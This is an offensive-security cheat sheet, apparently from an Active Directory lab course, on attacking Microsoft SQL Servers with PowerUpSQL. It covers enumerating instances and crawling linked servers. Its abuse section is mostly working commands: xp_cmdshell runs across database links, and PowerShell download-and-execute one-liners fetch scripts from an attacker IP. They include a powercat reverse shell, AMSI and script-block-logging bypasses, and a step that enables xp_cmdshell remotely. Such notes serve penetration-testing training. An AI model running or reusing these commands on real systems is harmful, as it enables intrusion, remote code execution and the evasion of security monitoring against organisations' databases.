# MSSQL Servers

## Tools

[PowerUpSQL ](https://github.com/NetSPI/PowerUpSQL)includes functions that support SQL Server discovery, weak configuration auditing, privilege escalation on scale, and post exploitation actions such as OS command execution.

{% embed url="https://github.com/NetSPI/PowerUpSQL" %}

## Enumeration

```powershell
# SPN - Get SPNs that start with MSSQL
Get-SQLInstanceDomain

# Check Access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 

# Information
Get-SQLInstanceDomain | Get-SQLServerInfo
```

### Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and Data Source Objects (OLE DB).

In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures even across forest trusts.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># find links to remote machine
</strong>Get-SQLServerLink -Instance dcorp-mssql
# Using HeidiSQL
# Returns details about the existing database links
select * from master..sysservers

# database links - Loops till the final database link is reached. 
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
# Using HeidiSQL - The above command does the following query in an automated way until the final database link is reached
select * from openquery("DCORP-SQL1", 'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
</code></pre>

## Abuse

We can use links to execute commands across database links where Sysadmin set to 1

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
# Using HeidiSQL 
SELECT *
FROM OPENQUERY("dcorp-sql1", '
    SELECT * 
    FROM OPENQUERY("dcorp-mgmt", ''
       SELECT *
       FROM OPENQUERY("EU-SQL32.EU.EUROCORP.LOCAL",''''
           SELECT @@version AS version;
           EXEC master..xp_cmdshell "powershell iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)";
       '''') 
    '')
')


# revshell example
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex ((New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1;powercat -c 172.16.100.83 -p 443 -e powershell''));"' -QueryTarget <dblink-name-where-the-cmd-to-be-executed> 

Get-SQLServerLinkCrawl -Instance dcrop-mssql -Query 'exec master..xp_cmdshell "powershell -c"iex(iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql1
```
{% endcode %}

In case that `rpcout` is enabled (disabled by default), xp\_cmdshell can be enabled using:

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```
